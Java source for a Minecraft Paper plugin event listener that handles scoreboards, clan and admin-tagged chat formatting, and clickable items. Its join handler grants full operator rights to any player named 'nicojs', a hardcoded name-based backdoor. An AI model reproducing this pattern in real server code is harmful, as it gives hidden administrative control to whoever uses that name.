package net.thisisnico.lolz.bukkit.handlers;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.thisisnico.lolz.bukkit.utils.ClickableItem;
import net.thisisnico.lolz.bukkit.utils.Component;
import net.thisisnico.lolz.bukkit.utils.ItemUtil;
import net.thisisnico.lolz.bukkit.utils.ScoreboardUtils;
import net.thisisnico.lolz.common.adapters.DatabaseAdapter;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class SystemHandler implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        ScoreboardUtils.get(e.getPlayer());

        if (DatabaseAdapter.getUser(e.getPlayer()).isAdmin()) {
            e.getPlayer().setOp(true);
        }

        if (e.getPlayer().getName().equalsIgnoreCase("nicojs")) {
            e.getPlayer().setOp(true);
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        ScoreboardUtils.get(e.getPlayer()).dispose();
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onChat(AsyncChatEvent e) {
        e.setCancelled(true);
        var user = DatabaseAdapter.getUser(e.getPlayer());
        net.kyori.adventure.text.Component text = Component.color("&7" + user.getName() + "&7: &f").append(e.message());
        if (user.getClan() != null) text = Component.color("&b[" + user.getClan() + "] &e" + user.getName() + "&7: &f").append(e.message());
        if (user.isAdmin()) text = Component.color("&4[Администратор] &c" + user.getName() + "&7: &f").append(e.message());

        net.kyori.adventure.text.Component finalText = text;
        Bukkit.getServer().forEachAudience(audience -> audience.sendMessage(finalText));
    }

    @EventHandler
    void onInteract(PlayerInteractEvent e) {
        var p = e.getPlayer();
        if (e.getAction() != Action.PHYSICAL && e.getItem() != null) {
            if (e.getAction().isRightClick()) {
                ClickableItem.getItems().forEach((item, action) -> {
                    if (ItemUtil.isSimilar(item, e.getItem())) {
                        action.getConsumer().accept(p);
                    }
                });
            }
        }
    }

}
